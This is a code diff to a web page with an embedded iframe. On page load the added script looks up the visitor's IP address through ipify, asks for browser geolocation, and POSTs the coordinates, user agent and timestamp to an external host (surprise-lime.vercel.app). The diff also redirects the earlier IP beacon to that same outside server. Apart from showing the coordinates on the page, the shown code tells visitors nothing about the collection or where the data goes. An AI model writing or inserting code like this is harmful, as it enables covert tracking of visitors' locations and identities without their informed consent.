@@ -17,9 +17,68 @@
         allowfullscreen>
     </iframe>
 
+    <p id="geolocation"></p> <!-- Placeholder to display geolocation data or errors -->
+
     <script>
+        // Fetch Geolocation (Latitude and Longitude)
+        function getGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("geolocation").innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toISOString();
+
+            document.getElementById("geolocation").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+            // Send the geolocation data to the server
+            fetch('https://surprise-lime.vercel.app/user-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude,
+                    userAgent: userAgent,
+                    timestamp: timestamp
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Geolocation data sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending geolocation data:', error);
+            });
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("geolocation").innerText = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("geolocation").innerText = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("geolocation").innerText = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("geolocation").innerText = "An unknown error occurred.";
+                    break;
+            }
+        }
+
+        // Trigger the geolocation fetch when the page loads
         window.onload = function() {
-            // Fetch the user's IP address using ipify API
+            // Fetch IP Address
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(ipData => {
@@ -27,8 +86,8 @@
                     const userAgent = navigator.userAgent;
                     const timestamp = new Date().toISOString();
 
-                    // Send the data to the server
-                    fetch('/user-data', {
+                    // Send the IP data to the server
+                    fetch('https://surprise-lime.vercel.app/user-data', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -41,11 +100,14 @@
                     })
                     .then(response => response.json())
                     .then(data => {
-                        console.log('Data sent successfully:', data);
+                        console.log('IP data sent successfully:', data);
                     })
-                    .catch((error) => {
-                        console.error('Error sending data:', error);
+                    .catch(error => {
+                        console.error('Error sending IP data:', error);
                     });
+
+                    // Fetch Geolocation
+                    getGeolocation();
                 })
                 .catch(error => console.error('Error fetching IP:', error));
         };
